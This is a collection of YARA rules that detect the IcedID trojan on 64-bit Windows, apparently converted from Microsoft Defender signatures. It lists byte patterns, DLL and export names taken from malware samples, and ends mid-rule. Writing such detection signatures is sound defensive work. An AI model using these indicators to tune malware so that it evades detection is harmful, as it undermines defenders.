rule Trojan_Win64_IcedID_SS_2147778423_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SS!MTB"
        threat_id = "2147778423"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {99 44 8b 4d ?? 41 f7 f9 44 ?? ?? ?? ?? ?? ?? 44 ?? ?? ?? ?? ?? ?? ?? 44 ?? ?? 2b 15 ?? ?? ?? ?? 2b 15 ?? ?? ?? ?? 2b 15 ?? ?? ?? ?? 03 15 ?? ?? ?? ?? 4c ?? ?? 42 ?? ?? ?? ?? 41 ?? ?? 44 ?? ?? 48}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_2147781661_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID!MTB"
        threat_id = "2147781661"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "mORCL.dll" ascii //weight: 1
        $x_1_2 = "Bwtw8u4lNCG8cycow1v1xqEcx9a" ascii //weight: 1
        $x_1_3 = "CyOJiJAEScVK1pf2np" ascii //weight: 1
        $x_1_4 = "D2fvm9xu679pKsc6X" ascii //weight: 1
        $x_1_5 = "E4y68iRzZ1Oi2hydBHZxQXQlgNfs2" ascii //weight: 1
        $x_1_6 = "FDws2tostGjZEZetGmnM" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AF_2147781758_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AF!MTB"
        threat_id = "2147781758"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {48 63 04 24 48 8b 4c 24 20 0f b6 04 01 89 44 24 04 48 63 0c 24 33 d2 48 8b c1 48 f7 74 24 40 48 8b c2 48 8b 4c 24 38 0f b6 04 01 8b 4c 24 04 33 c8 8b c1 48 63 0c 24 48 8b 54 24 28 88 04 0a}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AF_2147781758_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AF!MTB"
        threat_id = "2147781758"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "?dcjiqpr@@YAHXZ" ascii //weight: 3
        $x_3_2 = "?owhyhdwwnf@@YAHXZ" ascii //weight: 3
        $x_3_3 = "?vzadwct@@YAHXZ" ascii //weight: 3
        $x_3_4 = "DllRegisterServer" ascii //weight: 3
        $x_3_5 = "PluginInit" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AF_2147781758_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AF!MTB"
        threat_id = "2147781758"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "18"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "?hoperd@@YAHXZ" ascii //weight: 3
        $x_3_2 = "?surtW@@YAHXZ" ascii //weight: 3
        $x_3_3 = "?uniertW@@YAHXZ" ascii //weight: 3
        $x_3_4 = "SendMessageA" ascii //weight: 3
        $x_3_5 = "SystemParametersInfoW" ascii //weight: 3
        $x_3_6 = "DeleteFileA" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ASV_2147782141_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ASV!MTB"
        threat_id = "2147782141"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "24"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "BujQRGvkVans" ascii //weight: 3
        $x_3_2 = "DcZmPEhGDIdaPopinQ" ascii //weight: 3
        $x_3_3 = "FmfolOXQNaDEdSrUNC" ascii //weight: 3
        $x_3_4 = "HAFynQZqrI" ascii //weight: 3
        $x_3_5 = "IdyTQpubQBKbE" ascii //weight: 3
        $x_3_6 = "MxmLgluTQ" ascii //weight: 3
        $x_3_7 = "IsProcessorFeaturePresent" ascii //weight: 3
        $x_3_8 = "SwitchToThread" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_W_2147782483_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.W!MTB"
        threat_id = "2147782483"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "22"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {41 83 f9 0a 0f 9c c0 30 c8 41 ba c4 06 30 fe b8 ae 9b b9 14 41 0f 45 c2 44 39 c2 0f 94 44 24 06 41 b8 ae 9b b9 14 44 0f 45 d0 41 83 f9 0a 0f 9c 44 24 07 44 0f 4d d0 b8 ed 48 41 d8 41 b9 1b 6d 49 41}  //weight: 10, accuracy: High
        $x_3_2 = "ahtzmjlslojwm" ascii //weight: 3
        $x_3_3 = "asdxovghwzhf" ascii //weight: 3
        $x_3_4 = "bnzyqdincfi" ascii //weight: 3
        $x_3_5 = "chbequsohmyn" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AK_2147784029_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AK!MTB"
        threat_id = "2147784029"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "18"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "?gkerty@@YAHXZ" ascii //weight: 3
        $x_3_2 = "?ropqf@@YAHXZ" ascii //weight: 3
        $x_3_3 = "?sorte@@YAHXZ" ascii //weight: 3
        $x_3_4 = "KillTimer" ascii //weight: 3
        $x_3_5 = "GetMessageW" ascii //weight: 3
        $x_3_6 = "SendMessageW" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DA_2147784083_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DA!MTB"
        threat_id = "2147784083"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {42 8a 0c 2a 88 0a 48 ff c2 83 c0 ?? 75}  //weight: 1, accuracy: Low
        $x_1_2 = {8b c2 ff c2 83 e0 ?? 42 8a 44 20 ?? 30 01 48 ff c1 3b d3 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DA_2147784083_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DA!MTB"
        threat_id = "2147784083"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {41 8b c2 49 8b d2 48 33 d1 83 e0 3f 8a c8 48 d3 ca 48 3b d7 0f 84 5b 01}  //weight: 10, accuracy: High
        $x_3_2 = "agvyjdzypobnsargs" ascii //weight: 3
        $x_3_3 = "aqxwaxny" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DA_2147784083_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DA!MTB"
        threat_id = "2147784083"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 8b d0 c1 ea 10 2b c1 2b 83 ?? ?? ?? ?? 05 c3 e6 0b 00 89 83 ?? ?? ?? ?? 2b 4b 50 01 4b 30 48 63 4b 7c 48 8b 83 ?? ?? ?? ?? 88 14 01 41 8b d0 44 01 53 7c 48 63 4b 7c 48 8b 83 ?? ?? ?? ?? c1 ea 08 88 14 01}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DA_2147784083_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DA!MTB"
        threat_id = "2147784083"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "25"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8b 45 04 03 45 00 69 c0 ab aa aa aa 05 aa aa aa 2a 3d 55 55 55 55 72 54}  //weight: 10, accuracy: High
        $x_3_2 = "keptyu" ascii //weight: 3
        $x_3_3 = "ortpw" ascii //weight: 3
        $x_3_4 = "sortyW" ascii //weight: 3
        $x_3_5 = "DllRegisterServer" ascii //weight: 3
        $x_3_6 = "PluginInit" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DA_2147784083_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DA!MTB"
        threat_id = "2147784083"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Nbhasjyfuashfjkjashf" ascii //weight: 1
        $x_1_2 = "ScriptFreeCache" ascii //weight: 1
        $x_1_3 = "ScriptSubstituteSingleGlyph" ascii //weight: 1
        $x_1_4 = "ICDecompress" ascii //weight: 1
        $x_1_5 = "GYqlSt.dll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DA_2147784083_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DA!MTB"
        threat_id = "2147784083"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "DllRegisterServer" ascii //weight: 10
        $x_1_2 = "wveauerpvz.dll" ascii //weight: 1
        $x_1_3 = "bctrcctkuscxk" ascii //weight: 1
        $x_1_4 = "ccfuycdbwzevhwo" ascii //weight: 1
        $x_1_5 = "hslssolzqabyxaosd" ascii //weight: 1
        $x_1_6 = "izmnyenekutyncsfq" ascii //weight: 1
        $x_1_7 = "zegnyivuwjp.dll" ascii //weight: 1
        $x_1_8 = "adzuiooploldlvubd" ascii //weight: 1
        $x_1_9 = "baxjlemyikulpql" ascii //weight: 1
        $x_1_10 = "bjfplrauehwaonao" ascii //weight: 1
        $x_1_11 = "dhomosudruxzchk" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 5 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_DB_2147784089_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DB!MTB"
        threat_id = "2147784089"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CkntTFWfEZECr" ascii //weight: 1
        $x_1_2 = "GaRntnbDPXSXhrFOfsm" ascii //weight: 1
        $x_1_3 = "IIImxppOjpvRmCklyGT" ascii //weight: 1
        $x_1_4 = "KkncuHJQCJCwBbk" ascii //weight: 1
        $x_1_5 = "LkbvNbzwqWGaet" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DB_2147784089_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DB!MTB"
        threat_id = "2147784089"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "25"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {48 c1 eb 20 01 c3 81 c3 eb 14 00 00 89 df c1 ef 1f c1 fb 06 01 fb 89 df c1 e7 07 29 fb 8d 3c 03 81 c7 eb 14 00 00 01 d8 05 6a 15}  //weight: 10, accuracy: High
        $x_3_2 = "gloeqw" ascii //weight: 3
        $x_3_3 = "gwxbopw" ascii //weight: 3
        $x_3_4 = "jlxnew" ascii //weight: 3
        $x_3_5 = "KillTimer" ascii //weight: 3
        $x_3_6 = "SendMessageW" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DB_2147784089_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DB!MTB"
        threat_id = "2147784089"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "22"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {81 f9 9a d5 c9 bf 7e 2d 81 f9 bc 8b 54 f8 7e 60 81 f9 bd 8b 54 f8 0f 84 bb 00 00 00 81 f9 d6 b0 5b f8 0f 84 a9 00 00 00 81 f9 80 b1 1c 78 75 d0 e9 fd}  //weight: 10, accuracy: High
        $x_3_2 = "cr1.dll" ascii //weight: 3
        $x_3_3 = "SystemParametersInfoA" ascii //weight: 3
        $x_3_4 = "SendMessageA" ascii //weight: 3
        $x_3_5 = "GetClassNameA" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DB_2147784089_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DB!MTB"
        threat_id = "2147784089"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "DllRegisterServer" ascii //weight: 10
        $x_1_2 = "NLdpOWbUZ4.dll" ascii //weight: 1
        $x_1_3 = "RQNWsunDcb" ascii //weight: 1
        $x_1_4 = "dygVMudkA" ascii //weight: 1
        $x_1_5 = "oHbhdHsPQY" ascii //weight: 1
        $x_1_6 = "yGFVONhb" ascii //weight: 1
        $x_1_7 = "1t3Eo8.dll" ascii //weight: 1
        $x_1_8 = "LQyhsCdjl" ascii //weight: 1
        $x_1_9 = "SQccDmJlhE" ascii //weight: 1
        $x_1_10 = "VosQlBrX" ascii //weight: 1
        $x_1_11 = "ZBCIRCy" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 5 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_DC_2147784828_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DC!MTB"
        threat_id = "2147784828"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "iLqVk.dll" ascii //weight: 1
        $x_1_3 = "Ax0KRF3G0h" ascii //weight: 1
        $x_1_4 = "CgNMZhYAEld" ascii //weight: 1
        $x_1_5 = "JOG0dx6twU" ascii //weight: 1
        $x_1_6 = "KTMBtgl2bEA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DC_2147784828_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DC!MTB"
        threat_id = "2147784828"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "26"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {69 48 28 fd 43 03 00 81 c1 c3 9e 26 00 89 48 28 c1 e9 10 81 e1 ff 7f 00 00 8b c1 48 83 c4 28 c3}  //weight: 10, accuracy: High
        $x_10_2 = {48 8d 54 24 41 0f 28 05 bc 81 05 00 0f 29 42 ff c7 42 0f ff e7 e1 f7 c6 42 13 00 b8 01}  //weight: 10, accuracy: High
        $x_3_3 = "RtlLookupFunctionEntry" ascii //weight: 3
        $x_3_4 = "TranslateAcceleratorW" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DK_2147785257_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DK!MTB"
        threat_id = "2147785257"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 04 24 ff c0 89 04 24 8b 44 24 ?? 39 04 24 73}  //weight: 1, accuracy: Low
        $x_1_2 = {8b 0c 24 48 8b 54 24 ?? 0f b6 0c 0a 33 4c 24 ?? 81 e1 ?? ?? ?? ?? 8b c9 48 8d 15 ?? ?? ?? ?? 33 04 8a 89 44 24 ?? eb}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DK_2147785257_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DK!MTB"
        threat_id = "2147785257"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "19"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {80 44 04 28 f5 48 ff c0 48 83 f8 04 75 f2 48 8d 5c 24 30 48 8d 54 24 28 41 b8 04 00 00 00 48 89 d9}  //weight: 10, accuracy: High
        $x_3_2 = "JCNEV6d8lyPIReZcDYF8F2jSHU7U" ascii //weight: 3
        $x_3_3 = "dmbA9sd0TKBcJo74dOvcrk" ascii //weight: 3
        $x_3_4 = "kTenQXgP2tcD6v274" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DK_2147785257_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DK!MTB"
        threat_id = "2147785257"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "bstbSp.dll" ascii //weight: 10
        $x_1_2 = "BegbnafRleF" ascii //weight: 1
        $x_1_3 = "DaCqEdkLAv" ascii //weight: 1
        $x_1_4 = "PwQJgNgqHW" ascii //weight: 1
        $x_10_5 = "eVE9yL.dll" ascii //weight: 10
        $x_1_6 = "AtbMBuflxF" ascii //weight: 1
        $x_1_7 = "Bionkcszewb" ascii //weight: 1
        $x_1_8 = "WyTuBVfMRq" ascii //weight: 1
        $x_10_9 = "cGquLEJ7xV.dll" ascii //weight: 10
        $x_1_10 = "lHTWsOJxJ" ascii //weight: 1
        $x_1_11 = "natyWJDCiB" ascii //weight: 1
        $x_1_12 = "moZxsjVisY" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_WD_2147786446_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.WD!MTB"
        threat_id = "2147786446"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "19"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8b 10 48 83 c0 04 83 e9 04 89 17 48 8d 7f 04 73 ef 83 c1 04 8a 10 74 10}  //weight: 10, accuracy: High
        $x_3_2 = "anvsyyjsnxe" ascii //weight: 3
        $x_3_3 = "ixtdfrpdcv" ascii //weight: 3
        $x_3_4 = "pnpweugiibtexdq" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_D_2147787522_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.D!MTB"
        threat_id = "2147787522"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {41 89 c3 41 81 c3 18 8b e0 c1 41 83 eb 01 41 81 eb 18 8b e0 c1 41 0f af c3 83 e0 01 83 f8 00 0f 94 c3 80 e3 01 88 5d 02 41 83 fa 0a 0f 9c c3 80 e3 01 88 5d 03 c7 45 fc b6 ea 64 b3}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_D_2147787522_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.D!MTB"
        threat_id = "2147787522"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {8d 48 ff 0f af c8 f6 c1 01 0f 94 c1 83 3d ?? ?? ?? ?? 0a 0f 9c c0 08 c8 8b 0d ?? ?? ?? ?? 8b 15 ?? ?? ?? ?? 8d 71 ff 89 f7 0f af f9 84 c0 75 48 83 e7 01 e9 96}  //weight: 10, accuracy: Low
        $x_10_2 = {48 c1 ed 20 01 e9 89 cd c1 ed 1f c1 f9 06 01 e9 89 cd c1 e5 07 01 d5 29 e9 89 ca 81 c2 f7 0f 00 00 48 63 d2}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_ACS_2147793769_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.ACS!MTB"
        threat_id = "2147793769"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8b 7c 24 08 8d 5f 03 85 ff 0f 49 df 83 e3 fc 29 df 83 ff 02 bf 06 45 5b 7a 0f 44 fa eb 91 81 ff 58 4a 05 57 0f 84 a7 00 00 00 81 ff 48 78 eb 66 0f 85 79 ff ff ff 8b 7c 24 04 8d 5f 03 85 ff 0f 49 df 83 e3 fc 29 df 83 ff 01 8b 7c 24 04 89 7c 24 08}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_TX_2147796250_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.TX!MTB"
        threat_id = "2147796250"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "znibincxxbk.dll" ascii //weight: 1
        $x_1_2 = "cnersnjwfvhagmxle" ascii //weight: 1
        $x_1_3 = "eyhwotiyipnaodky" ascii //weight: 1
        $x_1_4 = "gtfgnxajamla" ascii //weight: 1
        $x_1_5 = "kbdekmmnbswoq" ascii //weight: 1
        $x_1_6 = "loxgjcnpoxpostah" ascii //weight: 1
        $x_1_7 = "pqdxnkecr" ascii //weight: 1
        $x_1_8 = "xopljosropmcueul" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AW_2147805944_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AW!MTB"
        threat_id = "2147805944"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {88 08 48 8b 04 24 3a ff 74 00 48 ff c0 48 89 04 24 66 3b e4 74 00 48 8b 44 24 08 48 ff c0 66 3b ff 74 9c 48 ff c8 48 89 44 24 30 e9}  //weight: 2, accuracy: High
        $x_2_2 = {48 8b 4c 24 08 8a 09 66 3b db 74}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AW_2147805944_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AW!MTB"
        threat_id = "2147805944"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "19"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {48 89 c3 48 83 eb 05 b9 08 c1 44 00 48 29 cb 50 b8 d7 0d 2c 00 48 01 d8 83 38 00 74 03}  //weight: 10, accuracy: High
        $x_3_2 = "sadl_64.dll" ascii //weight: 3
        $x_3_3 = "GetModuleHandleA" ascii //weight: 3
        $x_3_4 = "SHGetFolderPathA" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AW_2147805944_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AW!MTB"
        threat_id = "2147805944"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "18"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "AGieWrQ6lr" ascii //weight: 3
        $x_3_2 = "AorlM25lu" ascii //weight: 3
        $x_3_3 = "AyPYO7l" ascii //weight: 3
        $x_3_4 = "CoGetStdMarshalEx" ascii //weight: 3
        $x_3_5 = "CoImpersonateClient" ascii //weight: 3
        $x_3_6 = "PropVariantCopy" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {0f af d1 44 31 f2 83 ca fe 44 39 f2 0f 94 c1 83 f8 0a 0f 9c c3 30 cb b9 ec 7d 1b 2b bd ec 7d 1b 2b 75 05}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_1
